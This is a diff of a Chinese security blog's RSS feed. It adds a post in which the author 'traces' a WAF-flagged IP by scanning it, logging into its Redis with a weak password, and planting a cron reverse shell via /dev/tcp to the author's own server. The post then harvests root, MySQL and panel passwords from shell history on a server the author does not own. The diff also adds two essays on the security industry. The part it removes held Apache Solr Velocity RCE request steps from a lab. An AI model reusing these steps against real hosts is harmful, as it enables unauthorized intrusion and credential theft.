@@ -6,9 +6,272 @@
     <description>哨兵安全实验室</description>
     <link>https://www.sentrylab.cn/</link>
     <atom:link href="https://sentrylab.cn/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 13 Mar 2021 00:56:06 +0800</pubDate>
-    <lastBuildDate>Sat, 13 Mar 2021 00:56:06 +0800</lastBuildDate>
+    <pubDate>Thu, 15 Apr 2021 00:41:22 +0800</pubDate>
+    <lastBuildDate>Thu, 15 Apr 2021 00:41:22 +0800</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>blog: CST 2021年 4月14日 星期三：一次朔源事件的记录</title>
+        <description>&lt;h3&gt;&lt;em&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/em&gt;&lt;/h3&gt;
+
+&lt;h3 id=&quot;零起源&quot;&gt;零：起源&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;em&gt;一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声&lt;/em&gt;&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;甲方：小伙伴们接集团要求需对 &lt;em&gt;WAF全流量平台&lt;/em&gt; 攻击ip进行朔源…&lt;/p&gt;
+
+        &lt;ul&gt;
+          &lt;li&gt;废佬：这…（甲方你真可爱）&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，
+  落实外部可借力工具和资源，&lt;a href=&quot;https://www.github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;[@Bin4xin废佬]&lt;/a&gt;也加入此次探索学习中。&lt;/p&gt;
+
+        &lt;ul&gt;
+          &lt;li&gt;废佬：这…（领导你真可爱）&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;领导2：&lt;em&gt;文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》&lt;/em&gt;&lt;/p&gt;
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv    
+223.214.211.46
+36.59.38.115
+        
+$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
+16570
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+        &lt;ul&gt;
+          &lt;li&gt;废佬：这…（领导你真可爱）&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;于是废佬就开始了愉快 &lt;em&gt;boring&lt;/em&gt; 的朔源之旅&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;一上午欢乐时光--fofa安全工程师&quot;&gt;一：上午、欢乐时光 &amp;amp; fofa安全工程师&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;鲁迅：&lt;/p&gt;
+
+  &lt;p&gt;不会朔源的fofa安全工程师不是一个好的信息安全工程师&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;-1x01awksplit--linux&quot;&gt;# 1x01：awk、split &amp;amp; linux&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;步入主题之前，先对这些文件进行一些简单的操作：
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ split -l 300 全流量、WAF4月8日-4月12日攻击IP\(1\).csv ips_preview_by300_
+  $ cat ips_preview_by300_aa|wc -l                     
+     300
+  $ ll
+    total 1400
+    drwxr-xr-x  59 bin4xin  staff    1888  4 14 20:48 ./
+    drwxr-xr-x+ 43 bin4xin  staff    1376  4 14 20:45 ../
+    -rw-r--r--   1 bin4xin  staff    4548  4 14 20:48 ips_preview_by300_aa
+    -rw-r--r--   1 bin4xin  staff    4457  4 14 20:48 ips_preview_by300_ab
+    -rw-r--r--   1 bin4xin  staff    4481  4 14 20:48 ips_preview_by300_ac
+    ··· 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;just fofa：&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/emergency-response-and-traceability-by-fofa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;-1x02something-interesting&quot;&gt;# 1x02：Something Interesting&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;点击以了解 &lt;a href=&quot;https://fofa.so/&quot; target=&quot;_blank&quot;&gt;fofa安全工程师们&lt;/a&gt;与&lt;a href=&quot;https://x.threatbook.cn/&quot; target=&quot;_blank&quot;&gt;微步安全工程师们&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img align=&quot;left&quot; src=&quot;https://x.threatbook.cn/public/img/logo-in-header.882f692c.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;
+&lt;img align=&quot;right&quot; src=&quot;https://fofa.so/_nuxt/img/logo.d9ee5c4.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;欢乐而又短暂的上午如白驹过隙，一晃而过。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;二下午枯燥时光--渗透测试工程师&quot;&gt;二：下午、枯燥时光 &amp;amp; 渗透测试工程师&lt;/h3&gt;
+
+&lt;h4 id=&quot;-2x01nmapnc--linux-shell&quot;&gt;# 2x01：nmap、nc &amp;amp; linux shell&lt;/h4&gt;
+
+&lt;p&gt;终于：发现了一些有趣的：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE  SERVICE         VERSION
+22/tcp   open   ssh             OpenSSH 6.6.1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5 (RSA)
+|   256 9d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4 (ECDSA)
+|_  256 7b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1 (ED25519)
+80/tcp   open   http            nginx
+| http-ls: Volume /
+| SIZE  TIME               FILENAME
+| -     24-Feb-2021 13:21  admin/
+| -     24-Feb-2021 09:27  redis/
+| -     24-Aug-2017 04:55  staragent/
+| -     24-Feb-2021 08:44  www/
+| -     24-Feb-2021 08:44  www/htdocs/
+| -     13-Apr-2021 19:44  www/logs/
+|_
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Index of /
+888/tcp  open   http            nginx
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: 404 Not Found
+3306/tcp open   mysql           MySQL 5.5.62-log
+6379/tcp open   redis           Redis key-value store
+8080/tcp open   http            Apache Tomcat 8.5.63
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Apache Tomcat/8.5.63
+8888/tcp open   http            Ajenti http control panel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;事实上：这是一个宝塔面板，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8888+888&lt;/code&gt;端口；&lt;/li&gt;
+  &lt;li&gt;另一个事实是：这个被WAF报成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4月8日-4月12日攻击IP&lt;/code&gt;的IP， &lt;em&gt;mysql &amp;amp; redis&lt;/em&gt; 均为弱口令。
+    &lt;ul&gt;
+      &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://xz.aliyun.com/t/8018#toc-8&quot; target=&quot;_blank&quot;&gt;点击更多以了解redis渗透&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./redis-cli -h redis_target_ip           
+redis_target_ip:6379&amp;gt; get key
+(error) NOAUTH Authentication required.
+redis_target_ip:6379&amp;gt; 
+redis_target_ip:6379&amp;gt; auth 123456
+OK
+redis_target_ip:6379&amp;gt; get key
+(nil)
+redis_target_ip:6379&amp;gt; set  xx   &quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/your_vps_target/port 0&amp;gt;&amp;amp;1\n&quot;
+OK
+redis_target_ip:6379&amp;gt; config set dir /var/spool/cron/
+OK
+redis_target_ip:6379&amp;gt; config set dbfilename root
+OK
+redis_target_ip:6379&amp;gt; save
+OK
+redis_target_ip:6379&amp;gt; quit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;-2x02bashinformation-gathering--traceability-incident&quot;&gt;# 2x02：bash、Information gathering &amp;amp; Traceability incident&lt;/h4&gt;
+
+&lt;p&gt;于是我们通过上面步骤获得了服务器权限；&lt;em&gt;awesome ? next more awesome.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;NO OFFENCE:-)Thanks&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;更加了解linux和linux面板，否则就会显得十分业余，不管你是Development, operation and maintenance or security practitioners；
+    &lt;ul&gt;
+      &lt;li&gt;匮乏的linux知识导致的过多ssh连接：
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ps -ef|grep ssh|wc -l
+  50
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+      &lt;li&gt;错乱的终端与数据库命令运行：
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /home/admin/.bash_history 
+  sudo grep wordpress_admin_passwd /root/env.txt
+  /usr/local/mysql/bin/mysql -u root -p123456
+  sudo su rooe
+  sudo su root
+  sudo grep mysql_root_passwd /root/env.txt
+  mysql
+  alias mysql=/usr/local/mysql/bin/mysql
+  mysql
+  find / -name mysql.sock
+  sudo grep mysql_root_passwd /root/env.txt
+  msyql
+  sudo su root
+  grant all privileges on *.* to 'root'@'%' identified by 'pass-hidden';
+  grant all privileges on *.* to 'root'@'%' identified by '123456';
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+      &lt;li&gt;错误的linux权限分配：
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ps -ef|grep root
+  root      7963     1  0 Mar06 ?        00:39:39 /usr/bin/java -Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar -Dcatalina.base=/www/server/apache-tomcat-8.5.63 -Dcatalina.home=/www/server/apache-tomcat-8.5.63 -Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temp org.apache.catalina.startup.Bootstrap start
+  root     23017     1  0 Mar06 ?        00:00:00 nginx: master process nginx -c conf/nginx.conf
+  root     27803     1  0 Feb25 ?        01:17:18 ./redis-server *:6379
+  ···
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;同样的：通过history找到面板管理密码；
+    &lt;ul&gt;
+      &lt;li&gt;tools.py form BT panel：
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /root/.bash_history |grep tools
+  cd /www/server/panel &amp;amp;&amp;amp; python tools.py panel pass-hidden
+  $ cat /www/server/panel/tools.py
+        
+  if __name__ == &quot;__main__&quot;:
+      type = sys.argv[1]
+      if type == 'root':
+          set_mysql_root(sys.argv[2])
+      elif type == 'panel':
+          set_panel_pwd(sys.argv[2])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;所以，panel模式下对应的是面板密码设置；&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/stupid-bt-panel-control-pic.png&quot; alt=&quot;&quot; /&gt;
+至此，我们获得了 &lt;em&gt;root、redis、mysql、BT panel&lt;/em&gt; ；而本文并炫技，我们的初衷是朔源：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;mysql&lt;/em&gt;：数据库仅仅是存放论坛系统管理的信息及测试信息；&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;redis&lt;/em&gt;：配合 &lt;em&gt;mysql&lt;/em&gt;，不必多说；&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;BT panel：www、ftp、sql&lt;/em&gt; 等配置均为简单配置，没有参考价值。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;三总结&quot;&gt;三：总结&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；&lt;/li&gt;
+  &lt;li&gt;2、结合 &lt;em&gt;# 2x01 及 # 2x02&lt;/em&gt; 小结通篇结束并未发现攻击迹象、痕迹；&lt;/li&gt;
+  &lt;li&gt;3、为何被报为攻击IP不得而知。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;四申明&quot;&gt;四：申明&lt;/h3&gt;
+
+&lt;p&gt;作者：Bin4xin&lt;/p&gt;
+
+&lt;p&gt;转载请申明本文链接：&lt;a href=&quot;/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/&quot; target=&quot;_blank&quot;&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;以上。&lt;/p&gt;
+</description>
+        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/</link>
+        <guid isPermaLink="true">/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>主动防御</category>
+        
+        <category>信息搜集</category>
+        
+        <category>笔记</category>
+        
+      </item>
     
       <item>
         <title>blog: 辛丑·本命年 年后的一些思考</title>
@@ -50,6 +313,42 @@
     &lt;/ul&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;现存问题如下：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;如何在现阶段的网安环境下，打造出一支专业化团队：&lt;br /&gt;
+    |__ 1、网安实验室是否能够成立CTF战队？&lt;br /&gt;
+    |__ 2、企业安全专业化安全服务团队？&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;问题1、针对夺旗战队，我想：当下的拥有的资源便是最好的机会：
+    &lt;ul&gt;
+      &lt;li&gt;能够有本专业导师的指导同时，有一定生源来进行夺旗比赛
+        &lt;ul&gt;
+          &lt;li&gt;选取队长来保证战队的凝聚力和团队活力；&lt;/li&gt;
+          &lt;li&gt;管理团队应当采取比赛军事化管理；包括晨跑、内部攻防训练赛&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;生源的匹配问题：
+        &lt;ul&gt;
+          &lt;li&gt;在生源筛选时存在的问题：
+            &lt;ul&gt;
+              &lt;li&gt;或许在实验室的生源选择中，应当让所有有该行业兴趣的新生都加入进来，我始终相信的是，大学生活是自身兴趣的发掘过程，对他们的培养过程同时也是考核过程；&lt;/li&gt;
+              &lt;li&gt;因为当下存在的问题较为明显。&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;部分年轻新生，无法在团队的带跑下跟上节奏，踢出；&lt;/li&gt;
+          &lt;li&gt;小部分自身问题产生各种问题&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
 </description>
         <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
         <link> https://www.sentrylab.cn/blog/2021/thereis-something2say/</link>
@@ -289,6 +588,50 @@ if($link-&amp;gt;FetchArray($link-&amp;gt;query(&quot;SELECT * FROM User WHERE `
 &lt;/svg&gt;
 &lt;/div&gt;
 &lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;在当今网络安全行业趋于商业化的时代，如何能够保持一颗赤忱之心：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;当今网络安全之趋势，当在国家安全的大前提下：
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;教育行业应作为网络安全的”活水源头”，为这个年轻的行业输入足够的年轻血液，所以在此刻：&lt;br /&gt;
+  应当充分发挥教育职能的同时，对当下应用型、研究型专业的莘莘学子做有必要的引导；&lt;br /&gt;
+  因为当下很多学生、教师在当下行业无法认清自我，永远无法在正确的时间，做正确的事；&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;企业在这其中也扮演重要角色：
+显而易见的是，传统安全企业也面临着的抉择：&lt;/li&gt;
+      &lt;li&gt;适应市场或者是自己选择游戏规则；
+        &lt;ul&gt;
+          &lt;li&gt;大部分传统安全厂商选择的是适应市场
+            &lt;ul&gt;
+              &lt;li&gt;安服需求；夺旗需求；应付工信部门检查等。。。&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;爱加密等厂商：
+            &lt;ul&gt;
+              &lt;li&gt;自己创造需求，创造游戏规则。&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;对处于实习期的学生做好职业引导，网络安全行业在未来十年不会成为国家命脉行业，安全行业仅仅作为安全服务的形式为大众所熟知，如今的网络安全行业：&lt;/p&gt;
+
+  &lt;p&gt;国家层面：CTF赛事；护网行动；重大节日保障&lt;/p&gt;
+
+  &lt;p&gt;企业层面：工信局部门检查；等保；自身企业业务安全保障(一般来说，越针对自身企业业务有安全需求的公司，都拥有自己的安全团队)&lt;/p&gt;
+
+  &lt;p&gt;个人层面：个人数据、隐私、财产问题；&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;零当下网络安全行业ctf赛事之我见&quot;&gt;零、当下网络安全行业CTF赛事之我见&lt;/h2&gt;
 
 &lt;!--	oopos！被你发现了！
 * it工作人员（包括运维、开发等等）公司内的矛盾
@@ -2198,111 +2541,6 @@ Content-Length: 7249
         <category>CVE</category>
         
         <category>信息搜集</category>
-        
-      </item>
-    
-      <item>
-        <title>blog: 「vulnhub」:Apace-RCE漏洞复现总结</title>
-        <description>&lt;h2 id=&quot;apache-solr-vuln&quot;&gt;Apache-solr-vuln&lt;/h2&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.137.181:8983/solr/admin/cores?indexInfo=false&amp;amp;wt=json&quot;&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;s2&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
-    &lt;span class=&quot;s2&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
-  &lt;span class=&quot;s2&quot;&gt;&quot;initFailures&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,
-  &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s2&quot;&gt;&quot;demo&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;demo&quot;&lt;/span&gt;,
-      &lt;span class=&quot;s2&quot;&gt;&quot;instanceDir&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/var/solr/data/demo&quot;&lt;/span&gt;,
-      &lt;span class=&quot;s2&quot;&gt;&quot;dataDir&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/var/solr/data/demo/data/&quot;&lt;/span&gt;,
-      &lt;span class=&quot;s2&quot;&gt;&quot;config&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;solrconfig.xml&quot;&lt;/span&gt;,
-      &lt;span class=&quot;s2&quot;&gt;&quot;schema&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;managed-schema&quot;&lt;/span&gt;,
-      &lt;span class=&quot;s2&quot;&gt;&quot;startTime&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;2020-08-22T01:42:03.422Z&quot;&lt;/span&gt;,
-      &lt;span class=&quot;s2&quot;&gt;&quot;uptime&quot;&lt;/span&gt;:51628
-          &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;关键是这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deomo:namel;instanceDir...&lt;/code&gt;，修改数据包&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type: application/json&lt;/code&gt;，post数据修改内容：&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /solr/demo/config HTTP/1.1
-Host: 192.168.137.181:8983
-User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Macintosh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Intel Mac OS X 10.15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:79.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/79.0
-Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
-Accept-Language: zh-CN,zh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,zh-TW&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7,zh-HK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5,en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.3,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.2
-Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/json
-Content-Length: 259
-
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;s2&quot;&gt;&quot;update-queryresponsewriter&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s2&quot;&gt;&quot;startup&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;lazy&quot;&lt;/span&gt;,
-    &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;velocity&quot;&lt;/span&gt;,
-    &lt;span class=&quot;s2&quot;&gt;&quot;class&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;solr.VelocityResponseWriter&quot;&lt;/span&gt;,
-    &lt;span class=&quot;s2&quot;&gt;&quot;template.base.dir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
-    &lt;span class=&quot;s2&quot;&gt;&quot;solr.resource.loader.enabled&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt;,
-    &lt;span class=&quot;s2&quot;&gt;&quot;params.resource.loader.enabled&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt;
-  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-/////////////////////////////////////////////////////////////////////////////////////
-
-反包：
-HTTP/1.1 200 OK
-Connection: close
-Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
-Content-Length: 149
-
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;s2&quot;&gt;&quot;responseHeader&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:0,
-    &lt;span class=&quot;s2&quot;&gt;&quot;QTime&quot;&lt;/span&gt;:425&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
-  &lt;span class=&quot;s2&quot;&gt;&quot;WARNING&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;This response format is experimental.  It is likely to change in the future.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;rce payload:&lt;/p&gt;
